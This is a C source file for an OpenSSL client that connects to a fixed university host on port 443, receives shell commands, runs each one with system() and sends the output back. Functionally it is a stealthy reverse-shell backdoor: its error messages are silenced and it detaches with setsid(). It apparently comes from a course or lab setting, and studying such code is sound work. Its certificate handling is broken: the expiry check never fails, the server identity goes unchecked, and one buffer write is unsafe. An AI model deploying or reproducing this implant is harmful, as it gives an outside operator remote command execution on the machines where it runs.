// gcc -o client_ssl client_ssl.c -lssl -lcrypto
#include <arpa/inet.h>
#include <fcntl.h>
#include <netdb.h>
#include <netinet/in.h>
#include <openssl/bio.h>
#include <openssl/err.h>
#include <openssl/pem.h>
#include <openssl/ssl.h>
#include <openssl/x509.h>
#include <openssl/x509_vfy.h>
#include <resolv.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

#define MAX_STRING_SIZE 1024

typedef struct {
  int sslfd;
  SSL *ssl;
  SSL_CTX *sslctx;
} sslsocket;

int lookup_host(const char *host, char *adrr);
int create_socket(const char *addr, const int port, sslsocket *ssl_sock);
int execute(const char *command, int p, char *command_output);
int verify_cert_time_valid(X509 *cert);
void cleanup(sslsocket *ssl_sock, X509 *cert);
void send_response(int output_length, char *command_output,
                   sslsocket *ssl_sock);
void process(sslsocket *ssl_sock, X509 *cert);
int display(const char *buf, int p, char *command_output);

int main(int argc, char **argv) {

  int ret;
  char dest_url[] = "plmp.montefiore.uliege.be";
  char addr[16] = {0};
  char buf[MAX_STRING_SIZE];

  if (argc == 2 && strcmp("--localhost", argv[1]) == 0) {
    if (lookup_host(dest_url, addr) != 1) {
    //fprintf(stderr, "lookup_host() failed\n");
    //exit(1);
  }

    strcpy(addr, "127.0.0.1");
  }
  else{
    if (lookup_host(dest_url, addr) != 1) {
    //fprintf(stderr, "lookup_host() failed\n");
    exit(1);
  }
  }

  sslsocket *ssl_sock = malloc(sizeof(sslsocket));
  if (!ssl_sock) {
    //fprintf(stderr, "malloc() failed\n");
    exit(1);
  }

  if (create_socket(addr, 443, ssl_sock) != 1) {
    exit(1);
  }

  X509 *cert = NULL;
  X509_NAME *certname = NULL;

  cert = SSL_get_peer_certificate(ssl_sock->ssl);
  if (cert == NULL) {
    //fprintf(stderr, "Error: Could not get a certificate from: %s.\n", dest_url);
    exit(1);
  }

  certname = X509_NAME_new();
  certname = X509_get_subject_name(cert);
  if (!verify_cert_time_valid(cert)) {
    //fprintf(stderr, "Certificat is expired");
    if (SSL_write(ssl_sock->ssl, "DROP", strlen("DROP")) <= 0) {
      //fprintf(stderr, "failed to send message");
      exit(1);
    }
    ret = SSL_read(ssl_sock->ssl, buf, sizeof(buf)); /* get reply & decrypt */
    buf[ret] = 0;
    cleanup(ssl_sock, cert);
    exit(1);
  }

  process(ssl_sock, cert);

  return (0);
}

void process(sslsocket *ssl_sock, X509 *cert) {

  int pid;

  int recv_length, output_length = 0;
  char command[MAX_STRING_SIZE];
  char command_output[MAX_STRING_SIZE];
  int last_cmd_len = 0;
  struct sockaddr_in sa;

  int pipes[2];
  pipe(pipes);
  dup2(pipes[1], STDOUT_FILENO);
  dup2(pipes[1], STDERR_FILENO);
  close(pipes[1]);
  fcntl(pipes[0], F_SETFL, fcntl(pipes[0], F_GETFL) | O_NONBLOCK);
  setsid();
  SSL_write(ssl_sock->ssl, "CMD", 3);
  while (1) {
    output_length = 0;
    memset(command, 0, MAX_STRING_SIZE);
    memset(command_output, 0, MAX_STRING_SIZE);

    recv_length = SSL_read(ssl_sock->ssl, &command, sizeof(command) - 6);
    if (recv_length > 0) {

      if (strcmp(command, "exit") == 0) {
        break;
      }

      output_length = execute(command, pipes[0], command_output);
      if (output_length > 0) {
        SSL_write(ssl_sock->ssl, command_output, output_length);
      } else {
        SSL_write(ssl_sock->ssl, "0", 1);
      }
    } else {
      // Socket is closed
      break;
    }
  }

  cleanup(ssl_sock, cert);
}

int execute(const char *command, int p, char *command_output) {

  system(command);
  int output_length = read(p, command_output, MAX_STRING_SIZE);
  return output_length;
}

int display(const char *buf, int p, char *command_output) {
  puts(buf);
  return 1;
}

/* ---------------------------------------------------------- *
 * Free the structures we don't need anymore                  *
 * -----------------------------------------------------------*/
void cleanup(sslsocket *ssl_sock, X509 *cert) {
  SSL_shutdown(ssl_sock->ssl);
  SSL_free(ssl_sock->ssl);
  close(ssl_sock->sslfd);
  X509_free(cert);
  SSL_CTX_free(ssl_sock->sslctx);
}

int lookup_host(const char *host, char *adrr) {
  struct addrinfo hints, *result;
  void *ptr;

  memset(&hints, 0, sizeof(hints));
  hints.ai_family = PF_UNSPEC;
  hints.ai_socktype = SOCK_STREAM;
  hints.ai_flags |= AI_CANONNAME;

  if (getaddrinfo(host, NULL, &hints, &result) != 0) {
    //perror("getaddrinfo");
    return -1;
  }

  inet_ntop(result->ai_family, result->ai_addr->sa_data, adrr, 16);

  switch (result->ai_family) {
  case AF_INET:
    ptr = &((struct sockaddr_in *)result->ai_addr)->sin_addr;
    break;
  case AF_INET6:
    ptr = &((struct sockaddr_in6 *)result->ai_addr)->sin6_addr;
    break;
  }
  inet_ntop(result->ai_family, ptr, adrr, 16);

  freeaddrinfo(result);

  return 1;
}

/* ---------------------------------------------------------- *
 * create_socket() creates the socket & TCP-connect to server *
 * ---------------------------------------------------------- */
int create_socket(const char *addr, const int port, sslsocket *ssl_sock) {
  struct sockaddr_in s_addr;
  socklen_t sin_size;

  s_addr.sin_family = AF_INET;
  s_addr.sin_port = htons(port);
  s_addr.sin_addr.s_addr = inet_addr(addr);

  if ((ssl_sock->sslfd = socket(PF_INET, SOCK_STREAM, 0)) == -1) {
    //perror("socket");
    return -1;
  }
  if (connect(ssl_sock->sslfd, (struct sockaddr *)&s_addr, sizeof(s_addr)) ==
      -1) {
    //perror("connect");
    return -1;
  }

  if (SSL_library_init() < 0) {
    //perror("SSL_library_init");
    return -1;
  }
  OpenSSL_add_all_algorithms();

  ssl_sock->sslctx = SSL_CTX_new(SSLv23_client_method());
  ssl_sock->ssl = SSL_new(ssl_sock->sslctx);

  if (!SSL_set_fd(ssl_sock->ssl, ssl_sock->sslfd)) {
    //perror("SSL_set_fd");
    return -1;
  }
  if (SSL_connect(ssl_sock->ssl) != 1) {
    //perror("SSL_connect");
    return -1;
  }

  return 1;
}

int verify_cert_time_valid(X509 *cert) {
  time_t t;

  t = time(0);
  if (X509_cmp_time(X509_get_notBefore(cert), &t) > 0) {
    return -1;
  }

  if (X509_cmp_time(X509_get_notAfter(cert), &t) < 0) {
    return -1;
  }

  return 1;
}